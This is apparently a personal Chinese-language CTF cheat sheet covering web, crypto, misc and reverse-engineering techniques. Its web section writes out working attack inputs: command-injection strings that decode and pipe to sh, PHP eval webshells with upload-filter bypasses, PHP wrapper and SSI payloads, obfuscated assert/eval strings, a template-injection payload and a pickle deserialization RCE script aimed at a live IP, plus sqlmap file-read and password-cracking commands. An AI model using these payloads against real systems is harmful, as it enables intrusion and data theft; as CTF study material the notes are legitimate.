CTF Run
======

## Web
不能全信前端的代码提示

### HTTP

- HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode

#### httpie

> Chrome 无法显示源码时，可直接用工具(如 httpie)请求接口

##### HTTP (GET / POST) 工具

```bash
# GET
http GET http:x?name=felord&age=18

# POST
http POST http:x name=felord age=18
```

#### 前端伪造 ip

X-Forwarded-For: 127.0.0.1

有时候网站多刷新几次会有不同的发现
        
注意观察网站刷新的原因是否由 Cookie 等字段影响的？

### Linux

#### ping 注入

注入
```bash
ping -c 4 127.0.0.1 | ls
```

& 注入
```bash
ping -c 4 127.0.0.1&ls
```

使用 base64 解码
```bash
ping -c 4 127.0.0.1&cat 7672134566268.php| base64
```

base 64 绕过复杂的正则表达式
```bash
http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
# $IFS$ 是空格绕过
```

#### nmap 注入

```bash
-iL /flag -oN flag.txt
# 执行payload，将根目录下的flag文件内容作为扫描目标，并将扫描结果重定向到flag.txt文件中
```

#### 正则表达式工具
通过正则表达式来生成文本

https://onlinetexttools.com/generate-text-from-regex

正则表达式菜鸟工具

https://c.runoob.com/front-end/854/

### 端口扫描

#### nmap
> 端口扫描工具

### 文件
> 自己寻找文件时，要优先想到代码审计，查看 index.php 是什么内容

#### 目录扫描

##### dirsearch
> Web 目录扫描工具
```bash
# 用法：
python3 dirsearch.py -t 100 -u https://target
python3 dirsearch.py -t 100 --include-status 200-399 -u http://xxx
```

#### 文件注入

##### 中国蚁剑
```
PHP
1.编辑 PHP 文件内容:<?php eval(@$_POST['a']); ?>
2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
3.使用中国蚁剑连接该文件即可
```

#### Git

##### 手动抓取
> 实测抓取的记录比 scrabble 完整
```bash
wget -r http://xxx/.git
```
当 git log 找不到记录时，继续进行下面步骤

查看过去误操作改变的历史记录
```bash
git reflog
```
一个版本一个版本查看变动
```bash
git show xxx
```

##### GitHack
- 通过网站中泄漏的 .git 文件克隆出项目目录
- 需要 Python 2 环境

##### scrabble
> 查询网站泄漏的 .git 文件，并将本目录还原为网站目录
使用方法
```bash
git clone https://github.com/denny0223/scrabble.git
./scrabble http://example.com/​
```
> 在 M1 Mac 中，/Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Git工具/scrabble 保留了副本

#### Nginx

##### 目录穿越
穿越到上级目录 http://xxx/img../

### SQL 攻击

#### SQL 注入

##### sqlmap

###### GET
```bash
# 找到注入点，如 /?id=1
# 查数据库
python sqlmap.py -u http://x.com/?id=1 --dbs
# 查 N 数据库的表名
python sqlmap.py -u http://x.com/?id=1 -D N --tables
# 查 N 数据库的A 表的列名
python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
# 查 N 数据库的 A 表的 B 列数据
python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
```

###### POST
```bash
# 发送 POST 请求
python sqlmap.py -u http://x.com --data="name=a&pass=123456aaa"
# 此处的 name 和 pass 都是 POST 方法的参数
```

##### 服务端文件读取
```bash
python sqlmap.py -u http://61.147.171.105:56766/join.ok.php --data="username=a&passwd=a&age=1&blog=baidu.com" --file-read "/var/www/html/flag.php"
# 重点是 --file-read 参数
```

##### 万能密码表
> 有时候 sqlmap 无法使用，该方法可以登录进去
```url
http://xxx/?username=admin'or'1'='1&password=123456'or'1'='1
```

#### SQL 约束攻击

##### 加一个空格，SQL 查询不会变
> 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
```sql
SELECT * FROM users WHERE username='vampire     ';
```

### 代码注入

#### PHP

- index.php 的默认路径是 /var/www/html/index.php
- 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入

##### 文件漏洞
- 在做题的时候尽量多试几个题目的提示后缀​（如 index.php、source.php）

###### 上传
> 拿到 webshell
>
> 需要注意下，有时候后端是通过 HTTP Headers 的 content-type 来判断文件类型的，改了 content-type 即可绕过。（在 Brup 中，只用改 ------WebKit 下方的 content-type）遇到过一道题，上传类型必须用 image/jpeg，用 jpg 和 png 都不行。

**test.php**

- 1.编辑 PHP 文件内容:
```php
<?php eval(@$_POST['a']); ?>
```
- 2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
- 3.使用中国蚁剑连接该文件即可

(如果不成功，考虑绕过，试试 test.phtml 方法)【注意，有时候后端检测了文件中的内容，有 <? 就上传不了，可以考虑下面的方法 】

**test.phtml**

```html
<script language='php'>@eval($_POST['a']);</script>
```
**.htaccess 防止绕过 php**

如果服务端禁止上传 php，可以将 php 改为图片格式 (如 png) 欺骗服务器，再使用 .htaccess 将 png 指定为 php 文件执行。(需要注意下，传图片需要确保 HTTP Headers 的 content-type 为 image/jpeg，目前知道 .htaccess 支持 Nginx 和 Apache)

.htaccess 文件内容

```c
<FilesMatch "xin.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

 

###### 伪协议

**base64**
```url
http://xxx/?p=php://filter/convert.base64-encode/resource=flag.php
```

**text/plain**
```url
http://xxx/?p=data://text/plain,<?php system("ls")?>
```

**执行 system**
方法一
```url
http://xxx/?page='.system("cat ./templates/flag.php").
```
方法一不行的话，用方法二
```url
?p=system('cat flag.php | base64')
```
原因：
在某些服务器上，执行 system('cat flag.php') 命令将会返回一个空字符串，而不是预期的 flag.php 文件内容。这是因为在 shell 中，管道符 | 表示将前一个命令的输出作为后一个命令的输入。由于执行 system() 函数时，标准输出通常不被捕捉，因此无法获取 cat flag.php 的输出，并且 $a 将被设置为空字符串。
相反，system('cat flag.php | base64') 命令将会将 flag.php 文件内容进行 base64 编码，然后将编码结果作为字符串返回。由于 base64 编码只使用 ASCII 字符集，可以保证其在 PHP 脚本中的可靠性，并且可以从 $a 中获取到正确的返回值。

**GET 方法注入字符串到文件流**
将字符串 hello ctf 注入文件流 file
```url
http://xxx/?file=data://text/plain,hello ctf
```

**POST 方法注入字符串到文件流**
> POST 中，GET 方法的一个参数值是 php://input ，POST 中提交纯字符串可作为该参数的值（用于破解 PHP 读文件[如 file_get_contents]，此处可以自己构造文件内容）
```
http"//xxx/?file=php://input
post data:<?php system("ls /"); ?>
# 此处的 POST 只传字符串(不是键值对)
```

**文件协议**
> 用于url是重定向的情况
```
http://xxx/?url=file:///var/www/html/flag.php
```

**include 函数的特性**
> 查找 ../../../../ffffllllaaaagggg 文件
```
http://xxx/source.php?file=hint.php?../../../../../ffffllllaaaagggg
```

###### SSI 漏洞
- 1.Web 服务器已支持SSI（服务器端包含）
- 2.Web 应用程序未对对相关SSI关键字做过滤
- 3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）

提交 POST
```
用户名 <!--#exec cmd="ls ../"-->
密码 123123 (输入正确密码)
```

##### 绕过复杂的正则表达式
> 如 preg_match("/[A-Za-z0-9]+/",$code)

###### 取反执行某个函数
取反后 得到不可读的打印串，再将 url 编码
```php
<?php
$c='phpinfo';
$d=urlencode(~$c);
echo $d;
?>
# 返回：%8F%97%8F%96%91%99%90
```

###### 取反连接蚁剑
> 通过构建 assert（eval(_POST['test'])）来使蚁剑连接

```php
<?php
error_reporting(0);
$a='assert';
$b=urlencode(~$a);
echo '(~'.$b.')';
$c='(eval($_POST[1]))';
$d=urlencode(~$c);
echo '(~'.$d.')';
?>
# 得到 (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6)
```
再访问 url
```
http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
```

##### 执行系统命令

###### system('ls')

如果 system('cat flag.txt') 不成功，可以尝试如 system('cat f*.txt')。（或者可以尝试直接在浏览器访问这个文件）

##### 变量漏洞

###### 超级全局变量(输出所有全局变量的值)
```
http://xxx/?p=GLOBALS
```

##### 弱类型(==判断) 
> 知识点

**比较符**
- ===比较两个变量的值和类型；==比较两个变量的值，不比较数据类型。
- 在php中,如果bool和"任何其他类型"比较,"任何其他类型"会转换为bool。
  
###### MD5 绕过
举例（以下几个字符串可绕过弱类型 md5）
```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```
如果前一种方法不行，利用 md5 无法处理数组的特性绕过。(sha1 也无法处理数组类型，也适用此方法)
```
http://xxx/?v1[]=1&v2[]=2
```

###### 弱类型 if 绕过
下面的代码示例结果输出 1
```php
<?php 
$x=5;
$y="5s";
if ($x == $y) {
    echo 1;
}
?>
```

###### if(!$_GET['id']) 绕过
某个 GET 参数例如 id 的值为 0，在 PHP 中，!$_GET['id'] 该判断是 true。要绕过该判断，使用 id=0a 即可
>”0aaaa“=="0"是成立的，因为数字和字母不可比较，只要字母前面的数字全一样就可以

举例
```
if(!$_GET['id']) 是弱比较
if($_GET['id'] === null) 是强比较
```

##### 特殊函数的漏洞

###### strcmp
> 不支持数组，遇到数组会直接返回0
```
?id[]=1
```

##### 反序列化

> PHP 的反序列化和 Python 有很大区别。PHP 中只能根据原本模版 (class) 来改，只能改变属性值，不能修改方法 (只能修改构造方法)。PHP 的序列化更像是在前端构建和后端相匹配的数据结构。
>
> 反序列化也支持反序列化字符串。
>
> PHP 中类属性只能是 字符串、数值或 bool，只能在外部用 -> 指向其他类型（如函数）
>
> w00m->{a}: 表示调用 w00m 对象的 a 方法，a 是方法名的字符串

#### tplmap

> Python 注入(PHP 也有 SSTI)

##### 路径注入
- 注入某个 URL 路径
```bash
./tplmap.py -u http://xxx/*
# 此处 * 为注入的变量
```
- 拿到 shell
```bash
./tplmap.py -u http://xxx/* --os-shell
```
##### GET 注入
```bash
./tplmap.py -u http://xxx/?a=1
# GET 方法参数为 a
```
##### POST 注入
参数 --data
```bash
./tplmap.py -u http://xxx/ --data='"name=a&pass=*"'
```


#### Python

##### 模板注入
建议根据下面一点一点试
```
http://xxx/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
```

##### Unserializer
示例
```python
import base64
import pickle

import httpx


class A:
    def __reduce__(self):
        import subprocess
        s = '''
import subprocess

r = subprocess.run(
    'cat flag', # 此处可修改命令
    shell=True,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)
print(r.stdout.decode())
        '''
        return (subprocess.check_output, (["python3","-c",s],))


a = A()
data = {
    'payload': base64.b64encode(pickle.dumps(a)).decode()
}
a = base64.b64decode(data['payload'])
r = httpx.put('http://114.67.175.224:14014/flag', json=data)
print(f'r:{r.text}')
```

## Crypto

### 密文解码

#### ciphey
> 先尝试 ciphey -t "Encrypted input"

另外，如果能看出密钥，这种可能使用 AES 算法

#### base 格式
> 看到很长一串，可能是图片的 base64

**basetrack**

**普通解码**
```bash
python3 basecrack.py -b 编码文本
```

**自动解码**
```bash
python basecrack.py --magic -b 编码文本
```

**base64 转图片**
```bash
https://tool.jisuapi.com/base642pic.html
```

#### TomatoTools 来识别编码

##### 问题
- 软件的 base58 有问题
- Brainfuck 有问题

#### 肉眼识别密文类型

##### 栅栏密码
形如(不是标准格式) fg2ivyo}l{2s3_o@aw__rcl@

##### 培根密码

解密地址 http://www.metools.info/code/bacon193.html

形如 AABBBABBA
        
##### 社会主义核心价值观加密/解密
形如 公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治

##### ook
形如 Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.

解密地址 https://www.splitbrain.org/services/ook

    猪圈密码
        http://www.metools.info/code/c90.html
    Baudot Code (例如 11001 00011 00111 01001 11011  10110 11111  10000 01110 11011  10110 11111  01001 00001)
    ｜ https://www.boxentriq.com/code-breaking/baudot-code

##### 猪圈密码

形如下图

![](./img/猪圈密码.png)

解密地址 http://www.metools.info/code/c90.html

##### Baudot Code

形如 11001 00011 00111 01001 11011  10110 11111  10000 01110 11011  10110 11111  01001 00001

解密地址 https://www.boxentriq.com/code-breaking/baudot-code

##### html 的编码样子
形如 &#x66;&#x6c;&#x61;


### 密码学及文本处理工具

#### 编码任何类型的数据
> 任何类型的文件都可能被编码，可尝试用 stegpy 解编码

##### stegpy
普通提取
```bash
stegpy _image.png
```
带密码提取
```bash
stegpy _image.png -p 密码
```

#### Hash 类密文在线解密
https://www.cmd5.com/

#### 密码字典生成

##### crunch
> 生成该数字开头的所有手机号
```bash
crunch 11 11 -t 1391040%%%% -o 1.txt
```

##### 大小写转换
https://www.iamwawa.cn/daxiaoxie.html

## Misc

### 图片类型

- bitmap 格式的文件后缀是 bmp，TIFF 格式的后缀是 tif (这些类图片格式可以考虑直接改成 jpg 打开)

#### 二维码、条码识别
https://online-barcode-reader.inliteresearch.com/

#### 查看 hex 中有无线索
html 的编码样子

类似 &#x66;&#x6c;&#x61;

#### 图片属性里有可能藏有东西
> macOS 像 Windows 一样查看图片的备注
```bash
exiftool -verbose 1.jpg
# 其中输出内容的 XPComment 就是图片备注
```

#### 图片取征 Stegsolve

##### LSB
在 Stegsolve-Analyse-Data Extract 勾上右下角3个0，点 preview

##### 可能是图片宽高被修改了
- 1.可以在 Stegsolve-Analyse-File format 最上面查看图片的原始宽高
- 2.使用自动破解宽高的程序恢复(Python 脚本)

##### 合并多张图
如果有多张图，可以用 Stegsolve 合并(Image Combiner)

#### 另一种图片隐写解法 zsteg
> 主要用来检测 png 和 bpm (主要用于 LSB ?)
```bash
zsteg -a file
```

#### gif

##### 横向拼接
> 如果有很多图(gif)，可能是横向拼接起来的

图片拼接地址 http://www.atoolbox.net/Tool.php?Id=978

注意：有可能是按修改日期排序后拼接


##### 逐帧解析
注意: macOS 自带的逐帧解析可能有问题

- 1、使用stegsolve打开图片 
- 2、analyse-》frame browser，一帧一帧看
  
##### 逐帧查看（分割 gif）
```bash
convert cake.gif cake.png
```

##### 合并 gif
```bash
convert -delay 3 *.png output.gif 
# 上述命令可以将当前目录下的所有 *.png 文件合成并生成 output.gif 文件。其中在 output.gif 文件中，每帧的间隔时间可以通过 -delay 参数来设置。
```

##### 百度识图人物或其他

百度识图就算人物脸部不全，也可以识别试试

### 文件
>不要相信任何后缀类型
>
>efi 是 Unix 的可执行文件
>
>evt 是 Windows 的日志文件（好像需要 win 7 ?）

#### 查看文件类型
用 file 命令识别下是什么文件
```bash
file 文件名
```

#### txt
txt 文件有可能可以下滑，信息藏在最下面

#### word
如果是 word 文件可能有隐藏文字

#### 一个文件夹下一堆文件
用 VS Code 全局搜索关键词

#### 查看 cat 输出乱码的文件
匹配二进制文件的 flag
```bash
strings webshell.pcapng | grep -E '.{1,10}\{.{1,50}\}.*'
# webshell.pcapng 为二进制文件
```

#### 文件内部映像提取

##### binwalk
> 如果 binwalk 查到了内部映象却分离不了，应该尝试 foremost
>

**查照内部映像**
```bash
binwalk firmware.bin
```
注意:图片中有可能隐藏另一张图片

**文件自动提取**
```bash
binwalk -e firmware.bin
```

##### foremost

> 有时候用 binwalk 提取不了时，​可以用 foremost 提取。

**文件递归提取**
```bash
foremost -T ccc.pcap
```

#### pcapng 格式

##### http 类型
>可以全局搜索文件后缀，右键追踪 http 流

**注入类**

可以通过观察 HTTP 包的长度判断哪些是注入成功的，拼接收到的 ascii 码即可

操作方法: 先筛选出 http (搜索 http 即可)，再按 http 导出，导出界面选择按 size 排序可能会看到连续的 flag

**SQL 盲注简单原理**

例如（下面的流量按时间顺序排序）

```python
LIMIT 0, 1),1,1) )>64 AND

LIMIT 0, 1),1,1))>96 AND

LIMIT 0, 1),1, 1) )>112 AND

LIMIT 0,1),1,1) )>104 AND

LIMIT 0, 1),1, 1) )>100 AND

LIMIT 0, 1),1,1))>102 AND

LIMIT 0, 1),1,1))>101 AND

LIMIT 0,1),2,1))>96 AND

LIMIT 0,1),2,1))>112 AND

LIMIT 0,1),2,1))>104 AND

LIMIT 0,1),2,1))>108 AND

LIMIT 0,1),2,1) )>106 AND

LIMIT 0, 1),2,1))>107 AND

LIMIT 0, 1),3,1))>96 AND

LIMIT 0, 1),3,1))>112 AND

LIMIT 0,1),3,1))>104 AND

LIMIt 0,1),3,1))>100 AND

LIMIt 0,1),3,1))>98 AND

LIMIT 0, 1),3, 1))>97 AND
```

数字的第3列代表猜的字段位数，`>`后面的数字是 Ascii 码。数字的第3列相同时，取最后一个 Ascii 码(如果后面有状态码，需要保证这一行的状态码是200而不是404)。将取得的 Ascci 码拼接好即是完整的字段。（可以用字典来拼接。一般依次猜数据库名、表名、列名等）

##### 键盘输入(USB)

**KBE**
```bash
python KBE.py
```

#### cap 格式

可以根据此类型的文件破解 wifi 密码

使用 aircrack-ng，已经下载到了 Docker ctf 中

#### aircrack-ng

根据 1.txt 密码表破解 wifi 密码，如
```bash
aircrack-ng -w 1.txt wifi.cap
```

补充：生成密码表，该数字开头的所有手机号
```bash
crunch 11 11 -t 1391040%%%% -o 1.txt
```

#### 压缩文件

- 有的压缩文件只有内部的一个文件加密，可以手动试下其他文件能不能直接解压。
- 优先使用 unzip 命令解压，unzip 会自动解压上面提到的未加密文件。(但是遇到过编码不支持 unzip 的情况，所以不能只局限于 unzip)

##### zip爆破

###### 破解伪加密
```bash
java -jar ZipCenOp.jar r  压缩包名
# (macOS jdk 17 上报错不用管，运行后用 unzip 解压即可，macOS 的解压软件有坑【最新测试全能解压不错】)
```

###### 暴力破解 

**zipCrack**

```bash
git clone https://github.com/luckman666/zipCrack.git
cd zipCrack
python zipcrack.py -f  file.zip -d password.txt
# 注意:已经在 M1 Mac 的 /Users/Cyberbolt/Library/CloudStorage/OneDrive-个人/编程/CTF/工具/Misc/压缩包破解/zipCrack 处做了备份
```

**fcrackzip**

```bash
fcrackzip  -b -c 'aA1' -l 1-10 -u 文件名
```
```
-b 使用暴力算法
-D 使用字典破解
-B 查看当前机器破解速度
-v 显示更多信息
-p 使用字符串作为初始密码
-l 设置密码长度（1-10）
-u 不打印错误密码

-c指定字符集，字符集格式只能为 -c 'aA1!:' 
a 表示小写字母[a-z]
A 表示大写字母[A-Z]
1 表示阿拉伯数字[0-9]
! 感叹号表示任意特殊字符[!:$%&/()=?{[]}+*~#]
: 表示包含冒号之后的字符（不能为二进制的空字符），例如  a1:$%  表示 字符集包含小写字母、数字、$字符和%百分号

192837465  --->         [1]
a123  --->              [a1]
A123  --->              [A1]
Q123we  --->            [aA1]
Q123we!?  --->          [aA1:!?]
Qwe!?123  --->          [aA1:!?]
Qwe$%^&*(123  --->      [aA1!]
```
破解3位纯数字
```bash
fcrackzip -b -c 1 -l 3 -v file.zip
```

#### .dat 文件
开源的微信 Dat 文件(.dat)解码器 http://github.com/PiaoZhenJia/WeChatDatFileDecoder


## Reverse
> 做逆向的第一步可以先用 strings 观察下封装方式。比如发现过 PyInstaller 的打包

### 环境

#### macOS
##### ida64
按 f5 反编译，只能反编译 64 位
##### ida pro
不能用中文输入法

### ida
可以点 search-search text 来全局搜索

### PyInstaller 打包的 exe 逆向
#### python-exe-unpacker
```bash
python python_exe_unpack.py -i [malware.exe]
```
